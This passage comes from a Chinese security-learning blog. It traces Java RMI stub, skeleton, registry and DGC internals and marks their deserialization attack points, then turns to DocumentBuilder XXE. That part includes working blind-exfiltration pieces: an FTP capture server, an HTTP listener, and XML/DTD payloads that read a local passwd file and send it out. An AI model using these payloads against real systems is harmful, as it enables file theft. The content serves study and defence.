Util.createProxy(implClass, getClientRef(), forceStubUse); &#125; catch (IllegalArgumentException e) &#123; throw new ExportException( &quot;remote object implements illegal remote interface&quot;, e); &#125; if (stub instanceof RemoteStub) &#123; setSkeleton(impl); &#125; Target target &#x3D; new Target(impl, this, stub, ref.getObjID(), permanent); ref.exportObject(target); hashToMethod_Map &#x3D; hashToMethod_Maps.get(implClass); return stub; &#125; 可以看到在这个类里出现了stub，也就是最后客户端需要的存根 然后在这里很显然的创建了代理 stub = Util.createProxy(implClass, getClientRef(), forceStubUse); 这里的参数分别是我们最开始定义的远程对象类，UnicastRef实例对象（里面放着那个一堆信息的LiveRef），以及一个判断是否要强制创建stub的boolen对象 这里通过UnicastServerRef里的getClientRef()方法获取UnicastRef实例对象、 这里传入的ref其实就是UnicastRef里的ref，因为UnicastRef是UnicastServerRef父类，所以这里的ref和UnicastServerRef里封装的ref其实是同一个 然后接下来有个判断，判断是否创建存根 由于forceStubUse和ignoreStubClasses都是假，所以只要stubClassExists(remoteClass)是真就可以直接到createStub里 但是这里需要判断以我们的远程对象类的类名+_Stub为名字的类是否存在，存在才会成为true，这里我们不满足这个，所以进不了这个if判断 然后再往下，创建了一个动态代理。 这里就是给我们的远程调用类进行代理的 Invocationhandler里把UnicastRef实例对象放进去了 这里最核心的就是里边的ref，其实是同一个 毕竟这个代理对象就是代表远程对象的。 所以远程对象的Stub其实就是个动态代理，那么远程调用方法时就是调它的invoke方法，后续调用到的时候再分析。stub是要传给客户端使用的，客户端通过操作stub的UnicastRef，来调用服务端远程对象的UnicastServerRef，是一个对称关系。 接下来判断这个Stub是否属于RemoteStub，如果是就调用setSkeleton。 RemoteStub是jdk里内置的几个通用类，有Activation$ActivationSystemImpl_StubActivationGroup_StubDGCImpl_StubRMIConnectionImpl_StubRMIServerImpl_StubReferenceWrapper_StubRegistryImpl_Stub 接下来又创建了一个Target类 Target target = new Target(impl, this, stub, ref.getObjID(), permanent); public Target(Remote impl, Dispatcher disp, Remote stub, ObjID id, boolean permanent) &#123; &#x2F;&#x2F; 初始化 weakImpl 为一个 WeakRef 对象，它持有传入的 impl 对象，并将其添加到 ObjectTable 的 reapQueue 队列中。 this.weakImpl &#x3D; new WeakRef(impl, ObjectTable.reapQueue); &#x2F;&#x2F; 将传入的 disp 赋值给实例变量 disp。 this.disp &#x3D; disp; &#x2F;&#x2F; 将传入的 stub 赋值给实例变量 stub。 this.stub &#x3D; stub; &#x2F;&#x2F; 将传入的 id 赋值给实例变量 id。 this.id &#x3D; id; &#x2F;&#x2F; 使用 AccessController 获取当前线程的上下文。 this.acc &#x3D; AccessController.getContext(); &#x2F;&#x2F; 获取当前线程的上下文类加载器。 ClassLoader threadContextLoader &#x3D; Thread.currentThread().getContextClassLoader(); &#x2F;&#x2F; 获取传入的 impl 对象的类加载器。 ClassLoader serverLoader &#x3D; impl.getClass().getClassLoader(); &#x2F;&#x2F; 检查当前线程的上下文类加载器是否是传入的 impl 对象的类加载器的子级。 if (checkLoaderAncestry(threadContextLoader, serverLoader)) &#123; &#x2F;&#x2F; 如果是，则使用当前线程的上下文类加载器作为上下文类加载器。 this.ccl &#x3D; threadContextLoader; &#125; else &#123; &#x2F;&#x2F; 如果不是，则使用传入的 impl 对象的类加载器作为上下文类加载器。 this.ccl &#x3D; serverLoader; &#125; &#x2F;&#x2F; 将传入的 permanent 赋值给实例变量 permanent。 this.permanent &#x3D; permanent; &#x2F;&#x2F; 如果 permanent 为 true，则调用 pinImpl 方法将 impl 对象钉住（防止被 GC 回收）。 if (permanent) &#123; pinImpl(); &#125; &#125; Target可以理解为是一个远程服务实例，一个Target对应一个远程对象。里面保存了远程对象实例、对应的Stub、对应的远程引用对象UnicastServerRef，之前创建的LiveRef的ObjID。实际上Target就是用LiveRef的ObjID代表了这个远程对象，一个远程对象和一个LiveRef是绑定的。这里就包括了远程调用所需的全部对象了，远程调用就是Stub使用远程引用来调用远程对象上的方法。 创建完Target后，又调用了LiveRef的exportObject方法 ref.exportObject(target); 里面又调用了TCPEndPoint的exportObject 然后又是TCPTransport的exportObject public void exportObject(Target target) throws RemoteException &#123; synchronized (this) &#123; listen(); exportCount++; &#125; boolean ok &#x3D; false; try &#123; super.exportObject(target); ok &#x3D; true; &#125; finally &#123; if (!ok) &#123; synchronized (this) &#123; decrementExportCount(); &#125; &#125; &#125; &#125; listen方法里主要是监听一个端口 private void listen() throws RemoteException &#123; assert Thread.holdsLock(this); &#x2F;&#x2F; 断言当前线程已经拥有锁，如果不满足会抛出 AssertionError TCPEndpoint ep &#x3D; getEndpoint(); &#x2F;&#x2F; 获取 TCPEndpoint 对象 int port &#x3D; ep.getPort(); &#x2F;&#x2F; 获取 TCPEndpoint 对象的端口号 if (server &#x3D;&#x3D; null) &#123; &#x2F;&#x2F; 如果 Server 对象为 null if (tcpLog.isLoggable(Log.BRIEF)) &#123; &#x2F;&#x2F; 如果 TCP 日志记录器支持 brief 日志级别 tcpLog.log(Log.BRIEF, &quot;(port &quot; + port + &quot;) create server socket&quot;); &#x2F;&#x2F; 记录 brief 日志 &#125; try &#123; server &#x3D; ep.newServerSocket(); &#x2F;&#x2F; 创建 ServerSocket 对象 Thread t &#x3D; AccessController.doPrivileged( new NewThreadAction(new AcceptLoop(server), &quot;TCP Accept-&quot; + port, true)); &#x2F;&#x2F; 创建新线程，启动 AcceptLoop t.start(); &#x2F;&#x2F; 启动新线程 &#125; catch (java.net.BindException e) &#123; &#x2F;&#x2F; 如果端口已被占用，抛出 ExportException 异常 throw new ExportException(&quot;Port already in use: &quot; + port, e); &#125; catch (IOException e) &#123; &#x2F;&#x2F; 如果监听失败，抛出 ExportException 异常 throw new ExportException(&quot;Listen failed on port: &quot; + port, e); &#125; &#125; else &#123; &#x2F;&#x2F; 如果 Server 对象不为 null &#x2F;&#x2F; otherwise verify security access to existing server socket SecurityManager sm &#x3D; System.getSecurityManager(); &#x2F;&#x2F; 获取安全管理器 if (sm !&#x3D; null) &#123; &#x2F;&#x2F; 如果安全管理器不为 null sm.checkListen(port); &#x2F;&#x2F; 验证监听端口是否被授权访问 &#125; &#125; &#125; 首先获取了之前保存的TCPEndpoint和端口，然后调用了TCPEndpoint.newServerSocket，跟进去实际最后就是创建了个普通的ServerSocket。然后创建了一个新的AcceptLoop类的监听线程并开启。然后就是等待客户端的连接了。那么实际上服务就已经发布出去了。最后还有一步记录已经发布的Target，调用了TransPort的exportObject public void exportObject(Target target) throws RemoteException &#123; target.setExportedTransport(this); ObjectTable.putTarget(target); &#125; 在Target类里的setExportedTransport方法只是个简单的赋值操作，对应的TCPTransport保存进Target void setExportedTransport(Transport exportedTransport) &#123; if (this.exportedTransport &#x3D;&#x3D; null) &#123; this.exportedTransport &#x3D; exportedTransport; &#125; &#125; 然后调用ObjectTable类putTarget方法 static void putTarget(Target target) throws ExportException &#123; ObjectEndpoint oe &#x3D; target.getObjectEndpoint(); WeakRef weakImpl &#x3D; target.getWeakImpl(); if (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123; DGCImpl.dgcLog.log(Log.VERBOSE, &quot;add object &quot; + oe); &#125; synchronized (tableLock) &#123; if (target.getImpl() !&#x3D; null) &#123; if (objTable.containsKey(oe)) &#123; throw new ExportException( &quot;internal error: ObjID already in use&quot;); &#125; else if (implTable.containsKey(weakImpl)) &#123; throw new ExportException(&quot;object already exported&quot;); &#125; objTable.put(oe, target); implTable.put(weakImpl, target); if (!target.isPermanent()) &#123; incrementKeepAliveCount(); &#125; &#125; &#125; &#125; putTarget是把对象和target绑定，放进ObjectTable这个类的静态变量objTable里面。 下面这段代码因为获取了DGCImpl.dgcLog变量，触发了DGCImpl类的实例化。这是垃圾回收相关的类。 if (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123; DGCImpl.dgcLog.log(Log.VERBOSE, &quot;add object &quot; + oe); &#125; 然后就会调用里面的static代码块 static &#123; &#x2F;* * 在与任意当前线程上下文隔离的上下文中“导出”单例的DGCImpl。 *&#x2F; AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123; public Void run() &#123; ClassLoader savedCcl &#x3D; Thread.currentThread().getContextClassLoader(); try &#123; &#x2F;&#x2F; 设置上下文类加载器为系统类加载器 Thread.currentThread().setContextClassLoader(ClassLoader.getSystemClassLoader()); &#x2F;* * 将远程收集器对象手动放入表格中，以防止在端口上侦听。 * （UnicastServerRef.exportObject将导致传输侦听。） *&#x2F; try &#123; &#x2F;&#x2F; 创建并导出 DGCImpl dgc &#x3D; new DGCImpl(); ObjID dgcID &#x3D; new ObjID(ObjID.DGC_ID); LiveRef ref &#x3D; new LiveRef(dgcID, 0); UnicastServerRef disp &#x3D; new UnicastServerRef(ref); Remote stub &#x3D; Util.createProxy(DGCImpl.class, new UnicastRef(ref), true); disp.setSkeleton(dgc); &#x2F;&#x2F; 创建一个Target对象，并将其放入ObjectTable中 Permissions perms &#x3D; new Permissions(); perms.add(new SocketPermission(&quot;*&quot;, &quot;accept,resolve&quot;)); ProtectionDomain[] pd &#x3D; &#123; new ProtectionDomain(null, perms) &#125;; AccessControlContext acceptAcc &#x3D; new AccessControlContext(pd); Target target &#x3D; AccessController.doPrivileged(new PrivilegedAction&lt;Target&gt;() &#123; public Target run() &#123; return new Target(dgc, disp, stub, dgcID, true); &#125; &#125;, acceptAcc); ObjectTable.putTarget(target); &#125; catch (RemoteException e) &#123; throw new Error(&quot;exception initializing server-side DGC&quot;, e); &#125; &#125; finally &#123; &#x2F;&#x2F; 恢复上下文类加载器 Thread.currentThread().setContextClassLoader(savedCcl); &#125; return null; &#125; &#125;); &#125; 使用单例模式创建了一个DGCImpl对象，这个对象就是RMI的分布式垃圾处理对象，一旦有远程对象被创建，就会实例化这个对象，但也只会创建这一次。后面的代码和UnicastServerRef#exportObject里很像，创建一个代理。但这里和前面不同的是这是一个系统内置类，所以是直接创建了DGCImpl_Stub类，而不是创建的动态代理。 并且设置了disp的skeleton是DGCImpl_Skel。 disp.setSkeleton(dgc); 最后同样把这些放进Target，把Target保存进ObjectTable。 然后再把target保存到一个map表里，target里存放着一些信息 到这里服务发布就结束了。 最后在UnicastServerRef类的exportObject里return了一个stub，但代码里并没有接收。 第一步的创建远程对象的流程如图： 去掉垃圾回收的部分，创建远程对象本身并没有什么可以进行漏洞利用的部分，虽然步骤很繁琐，但实际上这一步基本上都是对ref进行一个又一个的封装。主要就是要把这个远程对象发布出去，然后利用动态代理创建一个stub，让之后的客户端可以通过stub来调用现在服务端发布的远程对象 创建注册中心接下来我们来看服务端的第二步 创建注册中心 Registry registry = LocateRegistry.createRegistry(1099); 首先是调用了LocateRegistry的createRegistry方法，参数就是rmi注册中心的端口1099 然后在RegistryImpl的构造方法里 由于不满足这个if判断的后半段 会进入else里然后创建LiveRef实例，再把这个实例塞进UnicastServerRef里，这里虽然和第一步的时候的参数不太一样，但其实经过一堆super之类的方法，最后调的构造方法都一样 然后就进了setup 这里边就一个赋值，然后再去调用UnicastServerRef的exportObject方法 这一幕在创建远程对象里也出现过 但是这次的参数明显有不同，最主要的就是第一个参数的类不同了，而且第三个参数由false变为了true 然后我们跟进到它进行动态代理的类里 在创建远程对象时，这个if判断我们没能进入，主要就是因为stubClassExists里判断我们没能为真 但是现在remoteClass是RegistryImpl类，而RegistryImpl_Stub是存在的 所以现在我们能进入if语句中了 跟进createStub里 这里就是利用反射的方式去实例化RegistryImpl_Stub 类，然后return回来 RegistryImpl_Stub 继承了 RemoteStub ，实现了 Registry。这个类实现了 bind/list/lookup/rebind/unbind 等 Registry 定义的方法，全部是通过序列化和反序列化来实现的。 然后执行完毕后跳出方法回到UnicastServerRef的exportObject方法里继续往下执行 所以此时的stub就是一个实例化了的RegistryImpl_Stub类 里边套着LiveRef 因为此时stub就是一个实例化了的RegistryImpl_Stub类，而RegistryImpl_Stub继承了RemoteStub 所以接下来程序要执行setSkeleton函数了，看这个名字就知道，这个是创建Skeleton的 根据最开始对rmi的介绍，我们知道在客户端有stub，而在服务端就对应有Skeleton。客户端通过stub请求远程方法，服务端就通过Skeleton去调用方法，然后通过Skeleton获取结果，最后传给客户端Stub，客户端就从Stub获取结果 跟进setSkeleton 进到createSkeleton 通过反射对RegistryImpl_Skel进行实例化，和获取RegistryImpl_Stub的步骤类似 后边那就和创建和发布远程对象类似了 先创建个target对象把信息都放一块 这里因为disp接收的是UnicastServerRef类，而UnicastServerRef的skel在setSkeleton已经被赋值了，所以现在disp的skel属性也有值了 然后就是再进LiveRef的exportObject方法 然后一堆调用调到listen 这里也是和第一步不太一样的地方，因为第一步里调TCPEndpoint的getLocalEndpoint方法的时候 这里得到的epList的值是null，但现在这个不是null，也就进入了else里，给ep赋值了，有了这个transport属性 （至于为什么会这样我也不知道，跟着调没调出出原因，不过应该不是端口问题，我调试的时候改了端口，在第一步时的结果也是null 我是笨比，这个应该是有个变量在第一次执行的时候被改变了或者是缓存的原因，导致如果不结束idea的调试而是直接重置帧会导致epList不为空 绑定注册说白了就是 bind 的过程，通常情况下，如果 Server 端和 Registry 在同一端，我们可以直接调用Registry 的 bind 方法进行绑定，具体实现在 RegistryImpl 的 bind 方法，就是将 Remote 对象和名称 String 放在成员变量 bindings 中，这是一个 Hashtable 对象。 先做个安全检查，然后再判断在hashtable中是否已经有了name这个键，如果没有就把name和object给put进hashtable里 客户端请求注册中心-客户端接下来来分析一下客户端的部分 首先是请求注册中心Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); 创建注册中心的时候是createRegistry，那请求的时候很自然就是get了 这里边就先判断端口，不存在就赋值成默认的1099端口，然后 再判断一下host 然后又是熟悉的在UnicastRef里套LiveRef 之后又是调用createProxy创建了一个代理对象，因为这个if成立，所以就直接进入了createStub里，不会去创建动态代理。 然后这一步就结束了。 里面的主要的过程和之前其实是一样的，就是创建并且返回了一个代理类 这个代理对象其实就是客户端的stub 之前我们说在创建远程对象的时候也有个stub，是UnicastServerRef返回回来的，但是代码里并没用去接收它 这里的stub也是createProxy创建的代理对象，所以其实是一样的东西（准确来说应该不太一样，直接通过createStub创建的是个代理对象，而不走createStub的创建的是个动态代理对象），只不过这里有接收它的东西 下一步，就是IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;);获取远程对象 Regsitry_Stub这里是class文件，没源码所以只能静态的跟了 首先是调用UnicastRef的newCall创建一个连接 接下来重点看var3.writeObject(var1); 它将lookup的参数进行了序列化的操作，这是客户端给注册中心传输的内容，那么如果注册中心想读取这个字符串，就会进行反序列化，这就有了造成反序列化漏洞的利用点 再看下面的super.ref.invoke(var2); 这里是调用的Unicastref里的invoke方法 这个invoke方法是stub里处理网络请求都要用到的方法 这里调用了call.executeCall()，call这里就是我们之前利用newCall创建的连接，所以这里就是调用了StreamRemoteCall类的executeCall方法 这个函数里面有个处理异常的部分 可以看到这里也有个反序列化的地方 执行完invoke后，在lookup里还有一个被攻击的地方 这里是将注册中心返回的结果进行反序列化，所以假设我们现在有一个恶意的注册中心，就能攻击客户端 然后我们来整理一下客户端请求注册中心的过程中可利用的攻击客户端的攻击点 攻击点一最明显的一个自然是在lookup里 将请求注册中心得到的内容进行反序列化的这一步 攻击点二第二个地方是 lookup里调用Unicastref里的invoke方法 然后在invoke里又调用了StreamRemoteCall类的executeCall方法 在这个方法里先调用getInputStream获得注册中心的返回值 然后在后面的处理异常的部分，假设是TransportConstants.ExceptionalReturn这个异常，那么就会进行一个反序列化的操作 攻击点二相比攻击点一利用范围更广泛 因为攻击点一只有lookup和list方法才有，而攻击点二在lookup、bind、list、rebind、unbind这几个方法里都有 客户端请求服务端-客户端在创建远程对象的时候我们提过 远程对象的Stub其实就是个动态代理，那么远程调用方法时就是调它的invoke方法，stub是要传给客户端使用的，客户端通过操作stub的UnicastRef，来调用服务端远程对象的UnicastServerRef IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;);这行代码就相当于获得远程对象的stub 接下来String s = remoteObj.sayHello();这一步就是去调用这个远程对象的stub 所以会先进RemoteObjectInvocationHandler的invoke里 这里有个invokeRemoteMethod(proxy, method, args);，就是负责方法调用的 在这里面又调用了ref.invoke，这个ref在请求注册中心的第一步里已经赋值了 所以这里相当于调了UnicastRef的invoke方法 在这里调用了一个marshalValue方法，是判断参数类型的，但是我们这里没参数，所以连if判断都进不去（ 判断完出来之后调了个call.executeCall();这里和请求注册中心的时候的攻击点一样 然后判断返回值是不是空，不为空的话就把结果放进in里，然后调用unmarshalValue 在unmarshalValue里也会判断类型，假如不是java的原始类型（就里边嵌的if里的那几种），那么就会到else里，对获得的in进行反序列化 这里是String，是引用类型，所以不满足判断，进行反序列化 这里就是服务端攻击客户端的攻击点 攻击点这部分也是有两个攻击点，一个就是UnicastRef里调用的call.executeCall() 另一个就上边说的在unmarshalValue里如果值不是原始类型，就会进入else里对服务端返回的内容进行反序列化 客户端请求服务端-注册中心这里要先知道断点下在哪 之前我们说客户端操作stub，服务端操作skel，所以断点应该下在skel里边 但是我们还是需要知道对应的位置 在创建注册中心的时候，我们调用了listen方法进行的网络监听 这里是开启了一个新线程 那监听肯定就是在这个线程完成的事，我们看里面的run方法 里面只有一个方法，再跟进去 这里又创建了一个线程池，跟进到ConnectionHandler的run方法 这个里边主要就是调用了run0 在run0里注册中心已经开始解析客户端传过来的一些东西了，但是重点在这 run0调用了handleMessages方法 这里会根据传过来的值做一些操作 默认情况下会调用serviceCall serviceCall里就是取出我们之前存入的target，可以把断点下在这里 可以看到程序断在这了 然后程序会获取target里的disp 可以看到是同一个disp 然后再到这一步，调用disp.dispatch 这里就相当于调用UnicastServerRef类里的dispatch方法 skel不为空，进入oldDispatch里 在oldDispatch里又会调用skel.dispatch 终于进入到skel中了 这里边有个switch方法 0对应bind 1对应list 2对应lookup 3对应rebind 4对应unbind 这里我们因为客户端用了lookup方法，所以这里应该是进入case 2里 这里接收了客户端传过来的内容，之前说了客户端传的时候调用了writeObject，也就是序列化的形式传的，那接收的时候肯定要调用readObject进行反序列化，因此这里有可能成为客户端攻击注册中心的攻击点 客户端请求服务端-服务端断点的位置和上一步一样，因为服务端和注册中心在一起，他们又都要处理网络请求 同样要到UnicastServerRef的dispatch里，不同的是这是skel为空 所以它就会继续往下走，走到这里 这里就也是判断参数，然后如果存在，就进入umarsharValue ，这里就和客户端请求服务端的时候的客户端一样了。只不过那里是客户端反序列化服务端返回的内容，这里是服务端反序列化客户端传入的内容 在之后就是真正调用方法了 然后就是再把调用后的结果进行序列化，然后又传回客户端 客户端请求服务端-dgc最后一个部分，关于dgc的流程 这里其实在第一部分创建远程对象的时候就写了一点，不过我已经忘干净了（ RMI 定义了一个 java.rmi.dgc.DGC 接口，提供了两个方法 dirty 和 clean： 客户端想要使用服务端上的远程引用，使用 dirty 方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。 客户端不使用的时候，需要调用 clean 方法来清楚这个远程引用。 DGC就是RMI里垃圾回收机制，具体介绍如下： 分布式垃圾回收，又称 DGC，RMI 使用 DGC 来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。 而既然 RMI 依赖于 DGC 做垃圾回收，那么在 RMI 服务中必然会有 DGC 层，在 yso 中攻击 DGC 层对应的是 JRMPClient，在攻击 RMI Registry 小节中提到了 skel 和 stub 对应的 Registry 的服务端和客户端，同样的，DGC 层中也会有 skel 和 stub 对应的代码，也就是 DGCImpl_Skel 和 DGCImpl_Stub，我们可以直接从此处分析，避免冗长的 debug。 总之dgc的具体作用就是垃圾回收的，然后他也有他对应的DGCImpl_Skel 和 DGCImpl_Stub 然后调用的话也是会到UnicastServerRef的dispatch里 再到UnicastServerRef的oldDispatch，然后执行DGCImpl_Skel的dispatch方法 这里有反序列化点 然后再说一下DGCImpl_Stub 在客户端上会调用DGCImpl_Stub 客户端lookup也会产生DGC通讯。（其实大多操作都会有DGC 在DGCImpl_Stub有clean和dirty两个方法，简单来看就都是垃圾回收的作用 而这两个方法里都调用了invoke 这就和客户端请求注册中心的攻击点二是一样的了 然后还有一点就是DGCImpl_Skel 里的switch的两个分支代表的就是DGCImpl_Stub的dirty和clean方法 总结这篇主要就讲一下rmi整个的流程，虽然还有一些地方不太清楚，但感觉写的还凑合吧，至于利用的部分还是再开一篇吧。 坦白讲目前我也不太清楚rmi的攻击是怎么实现的，因为我感觉这里如果要伪造rmi客户端进行攻击，那首先就需要知道服务端定义的远程对象的接口形式才能去传参。更何况这个远程对象还是绑定在本地的，不太清楚能不能绑到远程。而如果伪造服务端，那被攻击的客户端需要恰好调用这个伪造的服务端的方法，从直觉上来说应该不会有一个客户端去故意请求一个攻击者所在的服务器的方法吧。也许是在已经拿下rmi服务端的时候利用（？ 参考链接https://su18.org/post/rmi-attack/ 浅学RMI反序列化 | Boogiepop Doesn&#39;t Laugh (boogipop.com) Java反序列化RMI专题-没有人比我更懂RMI_哔哩哔哩_bilibili","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"}]},{"title":"Java安全","slug":"Java安全","date":"2023-04-20T06:57:05.000Z","updated":"2023-05-16T15:32:40.438Z","comments":true,"path":"2023/04/20/Java安全/","link":"","permalink":"https://ethe448.github.io/2023/04/20/Java%E5%AE%89%E5%85%A8/","excerpt":"","text":"找到了些其他师傅写的java漏洞文章，打算照着这些文章挨个看下去了，这篇博客就算个整合吧，放点有用但是又不值得单独开一章的那种 XML注入之DocumentBuilder与XXE攻击防御参考文章：XML注入之DocumentBuilder与XXE攻击防御 Mi1k7ea ] DocumentBuilderDocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。 漏洞成因简单来说就是DocumentBuilder可以解析xml，也能解析xml的各种实体，导致的xml的注入，触发xxe漏洞 因此就可以结合xxe的一些攻击方式去进行攻击 说一下盲带两种，一种是ftp，一种是http 先说ftp 先在本地开一个ftp服务 import java.io.IOException; import java.io.PrintWriter; import java.net.ServerSocket; import java.net.Socket; import java.util.NoSuchElementException; import java.util.Scanner; public class LocalFtpServer &#123; private static final int PORT &#x3D; 2121; private static final String RETR &#x3D; &quot;RETR&quot;; private static final String CWD &#x3D; &quot;CWD&quot;; private static final String TYPE &#x3D; &quot;TYPE&quot;; private static final String JUNK1 &#x3D; &quot;EPSV&quot;; private static final String JUNK2 &#x3D; &quot;EPRT&quot;; private static final String LIST &#x3D; &quot;LIST&quot;; public static void main(String[] args) throws IOException &#123; ServerSocket socket &#x3D; new ServerSocket(PORT); while (true) &#123; Socket client &#x3D; socket.accept(); new Thread(new Runnable() &#123; @Override public void run() &#123; StringBuilder sb &#x3D; new StringBuilder(); boolean startRecord &#x3D; false; try &#123; PrintWriter remoteSender &#x3D; new PrintWriter(client.getOutputStream(), true); Scanner remoteReader &#x3D; new Scanner(client.getInputStream(), &quot;UTF-8&quot;); &#x2F;&#x2F; FTP 的命令一般是 \\r\\n 作为一行的结束 remoteReader.useDelimiter(&quot;\\r\\n&quot;); remoteSender.println(&quot;220 xxe-ftp-server&quot;); while (true) &#123; String line &#x3D; remoteReader.nextLine(); System.out.println(&quot;&gt; &quot; + line); if (line.startsWith(&quot;USER&quot;)) &#123; remoteSender.println(&quot;331 password please - version check&quot;); &#125; else &#123; remoteSender.println(&quot;230 more data please!&quot;); &#125; if (!startRecord) &#123; if (line.startsWith(TYPE)) startRecord &#x3D; true; &#125; else &#123; if (line.startsWith(RETR)) &#123; sb.append(&#39;&#x2F;&#39;).append(line.replace(&quot;RETR &quot;, &quot;&quot;)); client.setSoTimeout(3000); String tail &#x3D; remoteReader.nextLine(); System.out.println(&quot;&gt; &quot; + tail); sb.append(&#39;\\n&#39;).append(tail); break; &#125; else if (line.startsWith(JUNK1) || line.startsWith(JUNK2)) &#123; &#x2F;&#x2F; nothing &#125; else if (line.startsWith(CWD)) &#123; sb.append(&#39;&#x2F;&#39;).append(line.replace(&quot;RETR &quot;, &quot;&quot;).replace(&quot;CWD &quot;, &quot;&quot;)); &#125; else if (line.startsWith(LIST)) &#123; sb.append(&#39;&#x2F;&#39;); break; &#125; else &#123; sb.append(&#39;\\n&#39;).append(line.replace(&quot;RETR &quot;, &quot;&quot;)); &#125; &#125; &#125; client.close(); &#125; catch (NoSuchElementException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#x2F;&#x2F; 为了兼容 CWD ，开头多补充了一个斜杠 System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;File Content&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;); String fileContent; fileContent &#x3D; sb.substring(1); System.out.println(fileContent); System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;File Content&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;); &#125; &#125;).start(); &#125; &#125; &#125; 存在xxe漏洞的代码 public class LocalEntityDemo &#123; public static void main(String[] args) throws ParserConfigurationException, IOException, SAXException, org.xml.sax.SAXException &#123; DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance(); DocumentBuilder builder &#x3D; dbf.newDocumentBuilder(); Document doc &#x3D; builder.parse(new File(&quot;src&#x2F;main&#x2F;resources&#x2F;user.xml&quot;)); &#x2F;&#x2F; NodeList nodes &#x3D; doc.getChildNodes(); &#x2F;&#x2F; for (int i &#x3D; 0; i &lt; nodes.getLength(); i++) &#123; &#x2F;&#x2F; if (nodes.item(i).getNodeType() &#x3D;&#x3D; Node.ELEMENT_NODE) &#123; &#x2F;&#x2F; System.out.println(nodes.item(i).getTextContent()); &#x2F;&#x2F; &#125; &#x2F;&#x2F; &#125; &#125; &#125; user.xml &lt;?xml version=\"1.0\"?> &lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM \"file:///d:/passwd.txt\"> &lt;!ENTITY % remote SYSTEM \"http://127.0.0.1:8000/test.dtd\"> %remote; %all; ]> &lt;root>&amp;send;&lt;/root> test.dtd &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;ftp:&#x2F;&#x2F;127.0.0.1:2121&#x2F;%file;&#39;&gt;&quot;&gt; 需要低版本的jdk，至少要小于8u161 否则会直接因为不合法的ftp命令导致报错 也就不能读取全部的信息了 然后是http的，这个只能读一行，多了就寄给你看 httpserver import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import com.sun.net.httpserver.spi.HttpServerProvider; import java.io.IOException; import java.io.OutputStream; import java.io.OutputStreamWriter; import java.net.HttpURLConnection; import java.net.InetSocketAddress; import java.net.URLDecoder; import java.nio.charset.StandardCharsets; public class LocalHttpServer &#123; public static void main(String[] args) throws IOException &#123; HttpServerProvider provider &#x3D; HttpServerProvider.provider(); HttpServer httpserver &#x3D; provider.createHttpServer(new InetSocketAddress(1234), 100); httpserver.createContext(&quot;&#x2F;&quot;, new MyResponseHandler()); httpserver.setExecutor(null); httpserver.start(); System.out.println(&quot;server started&quot;); &#125; public static class MyResponseHandler implements HttpHandler &#123; @Override public void handle(HttpExchange httpExchange) throws IOException &#123; System.out.println(&quot;Receive Request Start&quot;); String requestMethod &#x3D; httpExchange.getRequestMethod(); if (requestMethod.equalsIgnoreCase(&quot;GET&quot;)) &#123; System.out.println(URLDecoder.decode(httpExchange.getRequestURI().toString(), &quot;UTF-8&quot;)); String response &#x3D; &quot;&quot;; httpExchange.sendResponseHeaders(HttpURLConnection.HTTP_OK, response.getBytes(StandardCharsets.UTF_8).length); OutputStream responseBody &#x3D; httpExchange.getResponseBody(); OutputStreamWriter writer &#x3D; new OutputStreamWriter(responseBody, StandardCharsets.UTF_8); writer.write(response); writer.close(); responseBody.close(); &#125; System.out.println(&quot;Receive Request End&quot;); &#125; &#125; &#125; test.dtd &lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;%file;&#39;&gt;&quot;&gt; 其他的不改也行 多一行就去世 其他还有什么SAXBuilder的xxe，SAXParser的xxe，SAXReader的xxe 感觉都差不多 防御探讨XXE防御之setFeature设置 如果disallow-doctype-decl设置为true，无法Bypass； 如果external-general-entities设置为false，则只能解析内部实体而无法解析外部实体，此时能利用的只有XXE DoS攻击，但要看具体的JDK版本； 如果external-parameter-entities设置为false，则解析内部实体、外部普通实体而无法解析外部参数实体，此时可以进行外部普通实体的形式来攻击或者XXE DoS； 如果load-external-dtd设置为false，则解析内部实体、外部参数实体而无法解析外部普通实体，此时可以进行外部参数实体的形式来攻击或者XXE DoS； SpEL注入漏洞参考文章：Code-Breaking Puzzles — javacon WriteUp - Ruilin (rui0.cn) SpEL注入之javacon SpEL Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对象图；语法上类似于 Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL 的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。 SpEL语言，可以用于Spring Framework中的表达式语言，通常用于在运行时计算值，它支持访问和操作对象的属性，方法调用，操作符，条件等。下面是每行的具体作用： SpEL使用方式 SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。 &#x2F;&#x2F;构造一个解析器 ExpressionParser parser &#x3D; new 